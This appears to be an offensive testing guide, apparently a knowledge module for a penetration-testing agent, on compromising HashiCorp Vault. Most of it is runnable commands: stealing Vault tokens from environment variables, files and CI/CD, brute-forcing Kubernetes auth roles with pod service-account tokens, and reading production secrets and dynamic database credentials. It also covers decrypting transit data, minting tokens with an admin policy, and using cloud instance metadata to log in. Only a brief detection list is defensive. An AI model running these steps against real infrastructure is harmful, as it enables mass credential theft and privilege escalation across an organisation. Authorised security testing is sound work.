<vulnerability_guide>
  <title>SECRETS MANAGEMENT AND VAULT EXPLOITATION</title>

  <critical>HashiCorp Vault and similar secrets management systems are central stores for credentials, API keys, and certificates. Compromise provides access to secrets across the entire infrastructure. Misconfigurations, token leaks, and authentication bypasses can expose thousands of credentials at once.</critical>

  <scope>
    - Vault authentication bypass
    - Token and credential theft
    - Secret engine exploitation
    - Kubernetes auth abuse
    - Transit engine misuse
    - Audit log manipulation
  </scope>

  <methodology>
    1. VAULT DISCOVERY
       {% raw %}
       # Default Vault ports
       8200 - HTTP/HTTPS API
       8201 - Cluster port

       # Find Vault endpoints
       curl -s https://vault.target.com/v1/sys/health
       curl -s https://vault.target.com/v1/sys/seal-status

       # Kubernetes service discovery
       kubectl get svc -A | grep vault

       # Common Vault paths
       /vault/
       /v1/sys/
       /v1/auth/
       /v1/secret/
       {% endraw %}

    2. AUTHENTICATION TESTING
       {% raw %}
       # Check auth methods
       curl -s https://vault:8200/v1/sys/auth | jq

       # Common auth methods:
       # - token: Direct token auth
       # - kubernetes: K8s service account
       # - aws: AWS IAM
       # - ldap: LDAP/AD
       # - userpass: Username/password

       # Token auth
       curl -H "X-Vault-Token: $TOKEN" https://vault:8200/v1/secret/data/myapp

       # Kubernetes auth (from pod)
       JWT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
       curl --request POST \
         --data "{\"jwt\": \"$JWT\", \"role\": \"myapp\"}" \
         https://vault:8200/v1/auth/kubernetes/login

       # Default tokens
       # Root token from init (if leaked)
       # Dev mode: root token is "root"
       {% endraw %}

    3. TOKEN EXPLOITATION
       {% raw %}
       # Token capabilities check
       curl -H "X-Vault-Token: $TOKEN" \
         --request POST \
         --data '{"paths": ["secret/data/admin"]}' \
         https://vault:8200/v1/sys/capabilities-self

       # List accessible secrets
       curl -H "X-Vault-Token: $TOKEN" \
         --request LIST \
         https://vault:8200/v1/secret/metadata/

       # Read secret
       curl -H "X-Vault-Token: $TOKEN" \
         https://vault:8200/v1/secret/data/production/database

       # Token lookup (what can we do?)
       curl -H "X-Vault-Token: $TOKEN" \
         https://vault:8200/v1/auth/token/lookup-self
       {% endraw %}

    4. SECRET ENGINE ENUMERATION
       {% raw %}
       # List secret engines
       curl -H "X-Vault-Token: $TOKEN" \
         https://vault:8200/v1/sys/mounts | jq

       # KV secrets engine
       curl -H "X-Vault-Token: $TOKEN" \
         --request LIST \
         https://vault:8200/v1/secret/metadata/

       # Database secrets engine
       curl -H "X-Vault-Token: $TOKEN" \
         --request LIST \
         https://vault:8200/v1/database/roles

       # Get dynamic database creds
       curl -H "X-Vault-Token: $TOKEN" \
         https://vault:8200/v1/database/creds/readonly

       # PKI secrets engine
       curl -H "X-Vault-Token: $TOKEN" \
         --request LIST \
         https://vault:8200/v1/pki/roles
       {% endraw %}

    5. KUBERNETES AUTH ABUSE
       {% raw %}
       # From any pod, attempt Vault K8s auth

       # Get service account JWT
       JWT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

       # Try common role names
       for role in app myapp default admin webapp api; do
         curl -s --request POST \
           --data "{\"jwt\": \"$JWT\", \"role\": \"$role\"}" \
           https://vault:8200/v1/auth/kubernetes/login
       done

       # Role bound to namespace/serviceaccount
       # Try different serviceaccount JWTs

       # Create serviceaccount in target namespace
       # Use its token for Vault auth
       {% endraw %}
  </methodology>

  <advanced_techniques>
    <token_theft>
      {% raw %}
      # Find Vault tokens in environment

      # Common env vars
      env | grep -i vault
      # VAULT_TOKEN, VAULT_ADDR

      # Configuration files
      cat ~/.vault-token
      cat /etc/vault/token
      cat .env | grep VAULT

      # Container environments
      kubectl get pods -o json | jq '.items[].spec.containers[].env[] | select(.name | contains("VAULT"))'

      # CI/CD systems
      # GitLab: $VAULT_TOKEN
      # GitHub: secrets.VAULT_TOKEN
      {% endraw %}
    </token_theft>

    <response_wrapping_abuse>
      {% raw %}
      # Response wrapping creates single-use tokens

      # If you intercept wrapped response:
      WRAPPED_TOKEN=s.xxxxxx

      # Unwrap to get actual secret
      curl --request POST \
        -H "X-Vault-Token: $WRAPPED_TOKEN" \
        https://vault:8200/v1/sys/wrapping/unwrap

      # Race condition:
      # Legitimate client and attacker both try to unwrap
      # First one wins, second gets error
      {% endraw %}
    </response_wrapping_abuse>

    <transit_engine_abuse>
      {% raw %}
      # Transit engine for encryption/decryption

      # If you have transit access:
      # Decrypt data encrypted with Vault

      # List keys
      curl -H "X-Vault-Token: $TOKEN" \
        --request LIST \
        https://vault:8200/v1/transit/keys

      # Decrypt data
      curl -H "X-Vault-Token: $TOKEN" \
        --request POST \
        --data '{"ciphertext": "vault:v1:xxx"}' \
        https://vault:8200/v1/transit/decrypt/mykey

      # Sign arbitrary data (if permitted)
      curl -H "X-Vault-Token: $TOKEN" \
        --request POST \
        --data '{"input": "base64data"}' \
        https://vault:8200/v1/transit/sign/mykey
      {% endraw %}
    </transit_engine_abuse>

    <policy_escalation>
      {% raw %}
      # Vault policies control access

      # Read your policies
      curl -H "X-Vault-Token: $TOKEN" \
        https://vault:8200/v1/sys/policy

      # Look for overly permissive policies
      # path "secret/*" { capabilities = ["read"] }
      # path "*" { capabilities = ["list"] }

      # Token role abuse
      # Create tokens with more permissions
      curl -H "X-Vault-Token: $TOKEN" \
        --request POST \
        --data '{"policies": ["admin"]}' \
        https://vault:8200/v1/auth/token/create
      {% endraw %}
    </policy_escalation>

    <aws_auth_exploitation>
      {% raw %}
      # AWS auth method abuse

      # From AWS instance with IAM role
      # Get instance metadata
      PKCS7=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/pkcs7)

      # Login to Vault
      curl --request POST \
        --data "{\"role\": \"ec2-role\", \"pkcs7\": \"$PKCS7\"}" \
        https://vault:8200/v1/auth/aws/login

      # If role is too permissive
      # Any EC2 in account can assume it
      {% endraw %}
    </aws_auth_exploitation>
  </advanced_techniques>

  <detection>
    - Monitor Vault audit logs
    - Alert on unusual secret access patterns
    - Track token creation and usage
    - Monitor for bulk secret reads
    - Check for failed auth attempts
  </detection>

  <validation>
    - Successfully authenticate to Vault
    - Read secrets from various engines
    - Enumerate accessible paths
    - Exploit Kubernetes auth if available
    - Document all accessible credentials
  </validation>

  <pro_tips>
    - Vault dev mode uses "root" as root token
    - Kubernetes pods often have VAULT_ADDR and tokens in env
    - Response wrapping tokens are valid for limited time
    - Transit encryption keys can decrypt all data encrypted with them
    - Vault tokens in CI/CD logs are common
    - AppRole secret IDs may be predictable or leaked
  </pro_tips>

  <remember>Vault is the crown jewels of secrets management - compromising it exposes every secret in the organization. Focus on token theft first (environment variables, files, CI/CD), then authentication bypass. Kubernetes auth is especially valuable - every pod's service account token is a potential Vault credential.</remember>
</vulnerability_guide>
